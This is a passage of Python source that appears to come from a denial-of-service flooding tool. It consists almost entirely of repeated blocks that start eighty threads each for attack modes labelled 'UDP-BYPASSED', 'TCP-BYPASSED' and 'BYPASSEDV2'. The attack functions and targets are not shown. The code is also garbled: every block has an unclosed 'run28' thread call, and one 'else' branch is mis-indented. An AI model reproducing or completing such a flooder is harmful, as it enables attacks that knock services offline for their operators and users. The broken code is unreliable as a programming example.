		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'UDP-BYPASSED':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'TCP-BYPASSED':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
	if choice == 'BYPASSEDV2':
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()
else:
		th = threading.Thread(target = run)
		th.start()
		th = threading.Thread(target = run2)
		th.start()
		th = threading.Thread(target = run3)
		th.start()
		th = threading.Thread(target = run4)
		th.start()
		th = threading.Thread(target = run5)
		th.start()
		th = threading.Thread(target = run6)
		th.start()
		th = threading.Thread(target = run7)
		th.start()
		th = threading.Thread(target = run8)
		th.start()
		th = threading.Thread(target = run9)
		th.start()
		th = threading.Thread(target = run10)
		th.start()
		th = threading.Thread(target = run11)
		th.start()
		th = threading.Thread(target = run12)
		th.start()
		th = threading.Thread(target = run13)
		th.start()
		th = threading.Thread(target = run14)
		th.start()
		th = threading.Thread(target = run15)
		th.start()
		th = threading.Thread(target = run16)
		th.start()
		th = threading.Thread(target = run17)
		th.start()
		th = threading.Thread(target = run18)
		th.start()
		th = threading.Thread(target = run19)
		th.start()
		th = threading.Thread(target = run20)
		th.start()
		th = threading.Thread(target = run21)
		th.start()
		th = threading.Thread(target = run22)
		th.start()
		th = threading.Thread(target = run23)
		th.start()
		th = threading.Thread(target = run24)
		th.start()
		th = threading.Thread(target = run25)
		th.start()
		th = threading.Thread(target = run26)
		th.start()
		th = threading.Thread(target = run27)
		th.start()
		th = threading.Thread(target = run28
		th.start()
		th = threading.Thread(target = run29)
		th.start()
		th = threading.Thread(target = run30)
		th.start()
		th = threading.Thread(target = run31)
		th.start()
		th = threading.Thread(target = run32)
		th.start()
		th = threading.Thread(target = run33)
		th.start()
		th = threading.Thread(target = run34)
		th.start()
		th = threading.Thread(target = run35)
		th.start()
		th = threading.Thread(target = run36)
		th.start()
		th = threading.Thread(target = run37)
		th.start()
		th = threading.Thread(target = run38)
		th.start()
		th = threading.Thread(target = run39)
		th.start()
		th = threading.Thread(target = run40)
		th.start()
		th = threading.Thread(target = run41)
		th.start()
		th = threading.Thread(target = run42)
		th.start()
		th = threading.Thread(target = run43)
		th.start()
		th = threading.Thread(target = run44)
		th.start()
		th = threading.Thread(target = run45)
		th.start()
		th = threading.Thread(target = run46)
		th.start()
		th = threading.Thread(target = run47)
		th.start()
		th = threading.Thread(target = run48)
		th.start()
		th = threading.Thread(target = run49)
		th.start()
		th = threading.Thread(target = run50)
		th.start()
		th = threading.Thread(target = run51)
		th.start()
		th = threading.Thread(target = run52)
		th.start()
		th = threading.Thread(target = run53)
		th.start()
		th = threading.Thread(target = run54)
		th.start()
		th = threading.Thread(target = run55)
		th.start()
		th = threading.Thread(target = run56)
		th.start()
		th = threading.Thread(target = run57)
		th.start()
		th = threading.Thread(target = run58)
		th.start()
		th = threading.Thread(target = run59)
		th.start()
		th = threading.Thread(target = run60)
		th.start()
		th = threading.Thread(target = run61)
		th.start()
		th = threading.Thread(target = run62)
		th.start()
		th = threading.Thread(target = run63)
		th.start()
		th = threading.Thread(target = run64)
		th.start()
		th = threading.Thread(target = run65)
		th.start()
		th = threading.Thread(target = run66)
		th.start()
		th = threading.Thread(target = run67)
		th.start()
		th = threading.Thread(target = run68)
		th.start()
		th = threading.Thread(target = run69)
		th.start()
		th = threading.Thread(target = run70)
		th.start()
		th = threading.Thread(target = run71)
		th.start()
		th = threading.Thread(target = run72)
		th.start()
		th = threading.Thread(target = run73)
		th.start()
		th = threading.Thread(target = run74)
		th.start()
		th = threading.Thread(target = run75)
		th.start()
		th = threading.Thread(target = run76)
		th.start()
		th = threading.Thread(target = run77)
		th.start()
		th = threading.Thread(target = run78)
		th.start()
		th = threading.Thread(target = run79)
		th.start()
		th = threading.Thread(target = run80)
		th.start()